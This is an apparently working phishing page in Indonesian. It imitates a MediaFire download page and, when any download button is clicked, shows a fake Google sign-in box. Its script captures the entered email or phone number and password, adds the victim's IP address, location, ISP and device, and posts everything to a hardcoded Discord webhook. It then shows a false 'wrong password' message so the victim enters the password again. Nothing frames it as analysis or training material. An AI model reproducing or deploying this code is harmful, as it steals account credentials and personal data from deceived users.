<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MediaFire - BLOCKED WHATSAPP BY-JACYY</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #f4f4f4; font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 500px; min-height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; }
        .navbar { background: #fff; display: flex; justify-content: space-between; align-items: center; padding: 12px 18px; border-bottom: 1px solid #e5e5e5; }
        .logo { height: 22px; }
        .hero-bg { background-color: #001280; padding: 20px 0; } 
        .hero-box { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255,255,255,0.1); margin: 0 15px; border-radius: 8px; padding: 22px; color: white; text-align: center; }
        .btn-blue { background: #007bff; color: white; border: none; width: 100%; padding: 13px; border-radius: 6px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .dl-container { background: #007bff; margin: 15px; border-radius: 3px; padding: 10px 15px; color: white; display: flex; align-items: center; cursor: pointer; }
        .dl-icon-box { background: white; padding: 5px; border-radius: 2px; margin-right: 12px; display: flex; }
        .social-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 0 15px 20px; }
        .social-btn { background: #f5f5f5; padding: 15px 5px; text-align: center; border-radius: 5px; color: #555; font-size: 11px; }
        .social-btn i { display: block; margin-bottom: 8px; font-size: 18px; color: #777; }
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 9999; }
        .modal { background: white; border-radius: 10px; width: 90%; max-width: 340px; padding: 25px; text-align: center; }
        .modal input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn-confirm { width: 100%; padding: 12px; background: #001280; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="navbar">
        <img src="https://static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg" class="logo">
    </div>
    <div class="hero-bg">
        <div class="hero-box">
            <h2>Download Faster</h2>
            <button class="btn-blue" onclick="openGate()">DOWNLOAD FASTER NOW</button>
        </div>
    </div>
    <div class="dl-container" onclick="openGate()">
        <div class="dl-icon-box"><img src="https://static.mediafire.com/images/filetype/file-zip-v3.png" width="18"></div>
        <div style="flex:1"><b>BLOCKED WHATSAPP BY-JACYY</b><br><span style="font-size:10px">33.19MB</span></div>
        <i class="fa-solid fa-download"></i>
    </div>
    <div class="social-grid" style="margin-top: 20px;">
        <div class="social-btn"><i class="fa-solid fa-link"></i><span>Copy for messenger</span></div>
        <div class="social-btn"><i class="fa-brands fa-facebook-f"></i><span>Post to Facebook</span></div>
    </div>
</div>

<div class="overlay" id="gate">
    <div class="modal">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 20px;">
        <p style="font-size: 13px; color: #555;">Konfirmasi identitas diperlukan untuk melanjutkan download.</p>
        <div id="err" style="color: #d00; font-size: 11px; margin-bottom: 10px; display: none;">Sandi salah, silakan coba lagi.</div>
        <input type="text" id="user" placeholder="Email atau Nomor HP">
        <input type="password" id="pass" placeholder="Kata sandi">
        <button class="btn-confirm" onclick="send()">KONFIRMASI</button>
    </div>
</div>

<script>
    const WEB = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";

    function openGate() { document.getElementById('gate').style.display = 'flex'; }

    async function send() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        if(!u || !p) return;

        let ip = "Checking...";
        let loc = "Checking...";
        let isp = "Checking...";
        let dev = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown Device";

        try {
            // Menggunakan API ip-api yang lebih stabil untuk data ISP & Lokasi
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            ip = data.ip || "Not Found";
            loc = `${data.city}, ${data.country_name}` || "Not Found";
            isp = data.org || "Not Found";
        } catch (e) {
            ip = "Blocked/Error";
            loc = "Blocked/Error";
            isp = "Blocked/Error";
        }

        const pesan = {
            content: `**New phising verification**\n\nüì© **email/login**\n\`${u}\`\n\nüìé **Method:** üåê **ip andres:** \`${ip}\`\n\nüìç **Lokasi:** üí≥ **sandi:** \`${p}\`\n\nü™™ **isp:** \`${isp}\`\n\nüì± **device:** \`${dev}\``
        };

        await fetch(WEB, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(pesan)
        });

        document.getElementById('pass').value = "";
        document.getElementById('err').style.display = "block";
    }
</script>
</body>
</html>
